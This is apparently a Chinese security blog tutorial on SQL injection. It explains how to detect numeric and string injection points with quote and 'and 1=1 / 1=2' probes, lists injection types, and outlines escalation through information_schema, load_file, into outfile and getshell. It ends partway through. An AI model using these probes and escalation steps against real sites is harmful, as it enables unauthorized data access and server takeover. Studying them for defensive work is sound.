@@ -1,0 +1,2377 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="SQL注入实验, Redamancy">
+    <meta name="description" content="通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的 一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入 的数据，致使非法数据侵入系统。">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', '');
+</script>
+
+
+    <title>SQL注入实验 | Redamancy</title>
+    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/medias/logo.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/css/matery.css">
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/css/my.css">
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/css/reward.css">
+    
+
+
+
+    <script src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Redamancy" type="application/atom+xml">
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper head-container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Redamancy</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home moz-zoom" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-shield moz-zoom" style="zoom: 0.6;"></i>
+      
+      <span>安全</span>
+      <i class="fas fa-chevron-down moz-zoom" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/web%E5%AE%89%E5%85%A8">
+          
+          <i class="fas fa-globe moz-zoom" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Web安全</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/CTF%E7%BB%83%E4%B9%A0">
+          
+          <i class="fas fa-flag moz-zoom" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>CTF练习</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97">
+          
+          <i class="fas fa-shield-halved moz-zoom" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>红蓝对抗</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-code-branch moz-zoom" style="zoom: 0.6;"></i>
+      
+      <span>编程</span>
+      <i class="fas fa-chevron-down moz-zoom" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/Python">
+          
+          <i class="fab fa-python moz-zoom" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Python</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/%E4%B8%8EC%E7%9B%B8%E5%85%B3">
+          
+          <i class="fas fa-c moz-zoom" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>与C相关</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/Linux">
+          
+          <i class="fab fa-linux moz-zoom" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Linux</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-icons moz-zoom" style="zoom: 0.6;"></i>
+      
+      <span>生活</span>
+      <i class="fas fa-chevron-down moz-zoom" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/%E5%85%89%E4%B8%8E%E5%BD%B1">
+          
+          <i class="fas fa-image moz-zoom" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>光与影</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/%E9%98%85%E8%AF%BB">
+          
+          <i class="fas fa-book-open moz-zoom" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>阅读</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/musics">
+          
+          <i class="fas fa-music moz-zoom" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>音乐</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/%E8%A7%86%E9%A2%91%E8%AE%B0%E5%BD%95">
+          
+          <i class="fas fa-film moz-zoom" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>视频记录</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list moz-zoom" style="zoom: 0.6;"></i>
+      
+      <span>整理</span>
+      <i class="fas fa-chevron-down moz-zoom" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/catstags">
+          
+          <i class="fas fa-bookmark moz-zoom" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>分类&标签</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives">
+          
+          <i class="fas fa-file-lines moz-zoom" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>归档</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-link moz-zoom" style="zoom: 0.6;"></i>
+      
+      <span>交流</span>
+      <i class="fas fa-chevron-down moz-zoom" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/friends">
+          
+          <i class="fas fa-address-book moz-zoom" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>友链</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/contact">
+          
+          <i class="fas fa-comments moz-zoom" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>留言</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle moz-zoom" style="zoom: 0.6;"></i>
+      
+      <span>关于我</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search " title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <!--<li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>-->
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Redamancy</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-shield"></i>
+			
+			安全
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/categories/web%E5%AE%89%E5%85%A8 " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-globe" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Web安全</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/CTF%E7%BB%83%E4%B9%A0 " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-flag" style="position: absolute;left:50px" ></i>
+			      
+		          <span>CTF练习</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97 " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-shield-halved" style="position: absolute;left:50px" ></i>
+			      
+		          <span>红蓝对抗</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-code-branch"></i>
+			
+			编程
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/categories/Python " style="margin-left:75px">
+				  
+				   <i class="fa fab fa-python" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Python</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/%E4%B8%8EC%E7%9B%B8%E5%85%B3 " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-c" style="position: absolute;left:50px" ></i>
+			      
+		          <span>与C相关</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/Linux " style="margin-left:75px">
+				  
+				   <i class="fa fab fa-linux" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Linux</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-icons"></i>
+			
+			生活
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/categories/%E5%85%89%E4%B8%8E%E5%BD%B1 " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-image" style="position: absolute;left:50px" ></i>
+			      
+		          <span>光与影</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/%E9%98%85%E8%AF%BB " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-book-open" style="position: absolute;left:50px" ></i>
+			      
+		          <span>阅读</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/musics " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-music" style="position: absolute;left:50px" ></i>
+			      
+		          <span>音乐</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories/%E8%A7%86%E9%A2%91%E8%AE%B0%E5%BD%95 " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-film" style="position: absolute;left:50px" ></i>
+			      
+		          <span>视频记录</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			整理
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/catstags " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
+			      
+		          <span>分类&标签</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/archives " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-file-lines" style="position: absolute;left:50px" ></i>
+			      
+		          <span>归档</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-link"></i>
+			
+			交流
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/friends " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-address-book" style="position: absolute;left:50px" ></i>
+			      
+		          <span>友链</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/contact " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-comments" style="position: absolute;left:50px" ></i>
+			      
+		          <span>留言</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于我
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/medias/featureimages/15.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">SQL注入实验</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/">
+                                <span class="chip bg-color">安全攻防</span>
+                            </a>
+                        
+                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">SQL注入</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
+                                Web安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-03-28
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-03-29
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    6k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    22 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/prism/prism.min.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="一-SQL注入"><a href="#一-SQL注入" class="headerlink" title="一.SQL注入"></a>一.SQL注入</h1><h2 id="（一）基础知识"><a href="#（一）基础知识" class="headerlink" title="（一）基础知识"></a>（一）基础知识</h2><h3 id="1危害："><a href="#1危害：" class="headerlink" title="1危害："></a>1危害：</h3><p><strong>（1）操纵数据</strong></p>
+<p><strong>（2）数据写入，getshell，网站权限</strong></p>
+<hr>
+<h3 id="2-实质"><a href="#2-实质" class="headerlink" title="2.实质"></a>2.实质</h3><p><strong>通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的 一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入 的数据，致使非法数据侵入系统。恶意代码（参数值的传入），实现自定义的一种查询</strong></p>
+<h3 id="3-条件："><a href="#3-条件：" class="headerlink" title="3.条件："></a>3.条件：</h3><p><strong>1.可控制的变量，带入查询数据库，变量为存在过滤，过滤不严谨</strong></p>
+<h3 id="4-注意："><a href="#4-注意：" class="headerlink" title="4.注意："></a>4.注意：</h3><p>​       <strong>1）注入参数点的位置</strong></p>
+<p>​            <strong>2）不同数据库的注入思路不同</strong></p>
+<hr>
+<h3 id="5-SQL语句干扰符号：’，”，-，），"><a href="#5-SQL语句干扰符号：’，”，-，），" class="headerlink" title="5.SQL语句干扰符号：’，”，%，），}"></a>5.SQL语句干扰符号：’，”，%，），}</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#在MySQL中，下面谅两句查询的结果相同</span>
+<span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span>
+<span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="6-通过order-by猜测网页查询的字段数"><a href="#6-通过order-by猜测网页查询的字段数" class="headerlink" title="6.通过order by猜测网页查询的字段数"></a>6.通过order by猜测网页查询的字段数</h3><h3 id="7-注入分类"><a href="#7-注入分类" class="headerlink" title="7.注入分类"></a>7.注入分类</h3><p><strong>(1)数字型注入</strong></p>
+<p>当输入的参数为整型时，则有可能存在数字型注入漏洞。 </p>
+<p>假设存在一条 URL 为： HTTP://<a target="_blank" rel="noopener" href="http://www.aaa.com/test.php?id=1">www.aaa.com/test.php?id=1</a></p>
+<p> 可以对后台的 SQL 语句猜测为：</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>判断数字型漏洞的 SQL 注入点：</strong></p>
+<p>**① 先在输入框中输入一个单引号 ‘ **</p>
+<p>这样的 SQL 语句就会变为： </p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>不符合语法，所以该语句肯定会出错，导致脚本程序无法从数据库获取数据，从而使原来的页面出现异 常。</p>
+<p>**② 在输入框中输入 and 1 = 1 **</p>
+<p>SQL语句变为： </p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>语句正确，执行正常，返回的数据与原始请求无任何差异。</p>
+<p>**③ 在数据库中输入 and 1 = 2 **</p>
+<p>SQL 语句变为： </p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>虽然语法正确，语句执行正常，但是逻辑错误，因为 1 = 2 为永假，所以返回数据与原始请求有差异。 如果以上三个步骤全部满足，则程序就可能存在数字型 SQL 注入漏洞。</p>
+<p><strong>(2)字符型注入</strong></p>
+<p>当输入参数为字符串时，则可能存在字符型注入漏洞。数字型与字符型注入最大的区别在于：数字型不 需要单引号闭合，而<strong>字符型一般需要使用单引号来闭合</strong>。</p>
+<p> 字符型注入最关键的是如何<strong>闭合 SQL 语句以及注释多余的代码</strong>。</p>
+<p> 假设后台的 SQL 语句如下：</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>判断字符型漏洞的 SQL 注入点：</strong></p>
+<p>**① 还是先输入单引号 admin’ 来测试 **</p>
+<p>这样的 SQL 语句就会变为：</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span>'。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p> 页面异常。</p>
+<p>**② 输入： admin’ and 1 = 1 – **</p>
+<p>注意：在 admin 后有一个单引号 ‘ ，用于字符串闭合，最后还有一个注释符 – <strong>(两条杠后面还有一个空 格！！！)。</strong></p>
+<p> SQL 语句变为： </p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">and</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>页面显示正确。</p>
+<p>**③ 输入： admin’ and 1 = 2 – **</p>
+<p>SQL 语句变为： </p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">and</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">2</span> <span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>页面错误。 </p>
+<p>满足上面三个步骤则有可能存在字符型 SQL 注入。</p>
+<blockquote>
+<p><strong>如果没有反应，证明网站未处理，可能没有注入点。如果网页返回404，或者跳转，可能网站有过滤，也可能不存在注入点</strong></p>
+</blockquote>
+<p><strong>(3)其他类型</strong></p>
+<p>Cookie 注入、POST 注 入、延时注入等。 这些类型的注入归根结底也是数字型和字符型注入的不同展现形式或者注入的位置不同。 </p>
+<p>以下是一些常见的注入叫法： </p>
+<ul>
+<li>POST注入：注入字段在 POST 数据中 </li>
+<li>Cookie注入：注入字段在 Cookie 数据中 </li>
+<li>延时注入：使用数据库延时特性注入 </li>
+<li>搜索注入：注入处为搜索的地方 </li>
+<li>base64注入：注入字符串需要经过 base64 加密</li>
+</ul>
+<h3 id="8注入思路"><a href="#8注入思路" class="headerlink" title="8注入思路"></a>8注入思路</h3><ul>
+<li><p>明确数据库类型，权限</p>
+</li>
+<li><p>明确提交方法，参数类型</p>
+</li>
+<li><p>低权限：明确数据库记录信息系统表</p>
+<p>​                依次库，表，列，值，注入查询</p>
+<p>​                 找后台，登录，获取shell（可能失败）</p>
+</li>
+<li><p>高权限：文件读写，命令执行，注册表读取</p>
+</li>
+</ul>
+<h2 id="（二）mysql注入"><a href="#（二）mysql注入" class="headerlink" title="（二）mysql注入"></a>（二）mysql注入</h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><blockquote>
+<p>1）操作系统:@@version_compile_cs(不同的系统对数据库操作语句的大小写区分）</p>
+<p>2）数据库名:database()</p>
+<p>3）数据库用户:user()（专门管理数据库的账户）,root为最高权限，容易导致跨站注入数     据。普通用户：只能注入自己网站。数据库的配置文件决定用户的权限。</p>
+<p>4）数据库版本:version()（选择注入）</p>
+<p>5）其他网站路径（进行文件读取，为高权限读取做准备）</p>
+</blockquote>
+<h3 id="2-数据注入"><a href="#2-数据注入" class="headerlink" title="2.数据注入"></a>2.数据注入</h3><blockquote>
+<p>1）低版本（暴力或结合读取查询，表名，列名用猜的方式）</p>
+<p>2）高版本（information_schema有据查询）</p>
+</blockquote>
+<h3 id="3-高权限注入"><a href="#3-高权限注入" class="headerlink" title="3.高权限注入"></a>3.高权限注入</h3><blockquote>
+<p>1）常规查询</p>
+<p>2）跨库查询</p>
+<p>3）文件读写 </p>
+</blockquote>
+<hr>
+<h3 id="4-数据库自带方法"><a href="#4-数据库自带方法" class="headerlink" title="4.数据库自带方法"></a>4.数据库自带方法</h3><blockquote>
+<p>database()查询数据库名称</p>
+<p>user()查询数据库用户</p>
+<p>version()查询数据库版本</p>
+<p>information_schema –5.0以上版本才有，储存所有的数据库名，表名，列名，可以通过查询他获取指定数据库下面的表名或列名信息</p>
+</blockquote>
+<blockquote>
+<p>load_file():文件读取  ，</p>
+<p>into outfile()或into dumfile():  导出函数</p>
+</blockquote>
+<h3 id="5-information-shema"><a href="#5-information-shema" class="headerlink" title="5.information_shema"></a>5.information_shema</h3><blockquote>
+<p><strong>在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。</strong></p>
+<p><strong>因为非root型的数据库是无法看见数据库表名的</strong></p>
+<p><strong>数据库中的”.“表示下一级</strong></p>
